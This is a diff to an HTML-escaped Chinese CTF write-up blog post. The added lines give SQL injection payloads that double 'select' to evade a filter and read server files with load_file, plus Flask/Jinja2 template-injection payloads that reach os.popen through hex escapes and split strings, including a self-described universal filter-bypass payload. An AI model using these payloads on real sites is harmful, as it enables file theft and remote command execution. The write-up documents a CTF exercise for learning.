@@ -44,9 +44,17 @@
 &lt;h2 id=&#34;ezsql10&#34;&gt;ezsql1.0
 &lt;/h2&gt;&lt;h3 id=&#34;考点其实就是双写绕过select绕过空格&#34;&gt;考点其实就是双写绕过select，/**/绕过空格
 &lt;/h3&gt;&lt;p&gt;此题竟然是双写绕过select,我怎么说盲注的时候select database()可以，其它不行。由于替换了select，一度让我以为过滤了union&lt;/p&gt;
-&lt;p&gt;，不可以打联合注入。&lt;/p&gt;
+&lt;p&gt;，不可以打联合注入。结果复现的时候发现可以打&lt;/p&gt;
 &lt;h3 id=&#34;联合注入&#34;&gt;联合注入
 &lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;seselectlect&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;load_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/var/www/html/index.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#复现完后尝试读了下源码&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
@@ -78,7 +86,8 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;id=-1/**/union/**/seselectlect/**/1,2,group_concat(id,title,content)%09from%09xuanyuanCTF.info
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h3 id=&#34;布尔盲注&#34;&gt;布尔盲注
+&lt;/div&gt;&lt;img src=&#34;image-20250521224640151.png&#34; alt=&#34;image-20250521224640151&#34; style=&#34;zoom:50%;&#34; /&gt;
+&lt;h3 id=&#34;布尔盲注&#34;&gt;布尔盲注
 &lt;/h3&gt;&lt;p&gt;这里空格绕过倒是简单，一试就出来了。现在将题目重新推一遍&lt;/p&gt;
 &lt;p&gt;首先试一下，数字型，布尔盲注和时间盲注都可以打，差不多，这里就打布尔盲注吧&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -90,7 +99,7 @@
 &lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;id=1/**/and/**/1=1   #有回显
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;id=1/**/and/**/1&amp;gt;1	#无回显
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;id=1/**/and/**/1&amp;gt;1select #发现这个都有回显，那说明select被替换成空了
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;id=1/**/and/**/1&amp;gt;1select #发现这个都有回显，那说明select被替换成空了,这个语句测试是否关键词被替换,是否要双写绕很好
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://luo-kaihong.github.io/p/2025-%E8%BD%A9%E8%BE%95ctf/image-20250521195540078.png&#34;
@@ -254,7 +263,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;img src=&#34;image-20250521223649978.png&#34; alt=&#34;image-20250521223649978&#34; style=&#34;zoom:50%;&#34; /&gt;
-&lt;p&gt;这里主要是学到了盲注读源码，这样以后方便多了&lt;/p&gt;
+&lt;p&gt;这里主要是学到了盲注读源码，这样以后方便多了,也学到了关键词被替换测试的方法&lt;/p&gt;
 &lt;h2 id=&#34;ezjs&#34;&gt;ezjs
 &lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -322,7 +331,8 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;h2 id=&#34;ezflask&#34;&gt;ezflask
-&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;/h2&gt;&lt;p&gt;fuzz一下，主要lipsum,cycler，点和一些关键词被过滤了，那就用get_flashed_messages，点过滤用[],关键词就分号&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
@@ -342,7 +352,38 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;()}}
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;上面手动构造，有点问题，第一个可以跑，第二个跑部了？？直接fenjin跑&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;手动构造，有点问题，第一个payload可以跑，第二个跑不了？？仔细一看，原来是命令被替换为空,那又引号绕过&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{{get_flashed_messages[&amp;#34;__globals__&amp;#34;][&amp;#34;o&amp;#34;&amp;#34;s&amp;#34;][&amp;#34;pop&amp;#34;+&amp;#34;en&amp;#34;](&amp;#34;t&amp;#34;&amp;#34;ac /f???&amp;#34;)[&amp;#34;re&amp;#34;&amp;#34;ad&amp;#34;]
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;()}}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;img src=&#34;image-20250521234936166.png&#34; alt=&#34;image-20250521234936166&#34; style=&#34;zoom:50%;&#34; /&gt;
+&lt;p&gt;其实这里还要很多可以用&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{{joiner[&amp;#34;__init__&amp;#34;][&amp;#34;__globals__&amp;#34;][&amp;#34;o&amp;#34;&amp;#34;s&amp;#34;][&amp;#34;pop&amp;#34;+&amp;#34;en&amp;#34;](&amp;#34;t&amp;#34;&amp;#34;ac /f???&amp;#34;)[&amp;#34;re&amp;#34;&amp;#34;ad&amp;#34;]
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;()}}
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{{namespace[&amp;#34;__init__&amp;#34;][&amp;#34;__globals__&amp;#34;][&amp;#34;o&amp;#34;&amp;#34;s&amp;#34;][&amp;#34;pop&amp;#34;+&amp;#34;en&amp;#34;](&amp;#34;t&amp;#34;&amp;#34;ac /f???&amp;#34;)[&amp;#34;re&amp;#34;&amp;#34;ad&amp;#34;]
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;()}}
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{{url_for[&amp;#34;__globals__&amp;#34;][&amp;#34;o&amp;#34;&amp;#34;s&amp;#34;][&amp;#34;pop&amp;#34;+&amp;#34;en&amp;#34;](&amp;#34;t&amp;#34;&amp;#34;ac /f???&amp;#34;)[&amp;#34;re&amp;#34;&amp;#34;ad&amp;#34;]
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;()}}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这题可以直接fenjin跑&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -352,7 +393,28 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;img src=&#34;image-20250521114535537.png&#34; alt=&#34;image-20250521114535537&#34; style=&#34;zoom:50%;&#34; /&gt;
-&lt;h1 id=&#34;密码&#34;&gt;密码
+&lt;p&gt;我尝试造一个可以绕过差不多大部分的万能payload,这个舍弃了lipsum与cycler这中常用的函数，而且编码绕过了下划线与点，除非它过滤了引号或者数字或者/&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;原型：{{joiner.__init__.__globals__.os.popen(&amp;#39;ls /&amp;#39;).read()}}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{{joiner[&amp;#34;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&amp;#34;][&amp;#34;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&amp;#34;][&amp;#34;\x6f\x73&amp;#34;][&amp;#34;\x70\x6f\x70\x65\x6e&amp;#34;](&amp;#34;ls /&amp;#34;)[&amp;#34;\x72\x65\x61\x64&amp;#34;]()}}	
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{{joiner[&amp;#34;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&amp;#34;][&amp;#34;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&amp;#34;][&amp;#34;\x6f\x73&amp;#34;][&amp;#34;\x70\x6f\x70\x65\x6e&amp;#34;](&amp;#34;t&amp;#34;&amp;#34;ac /f*&amp;#34;)[&amp;#34;\x72\x65\x61\x64&amp;#34;]()}}	
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h1 id=&#34;密码&#34;&gt;密码
 &lt;/h1&gt;&lt;h2 id=&#34;简单编码&#34;&gt;简单编码
 &lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
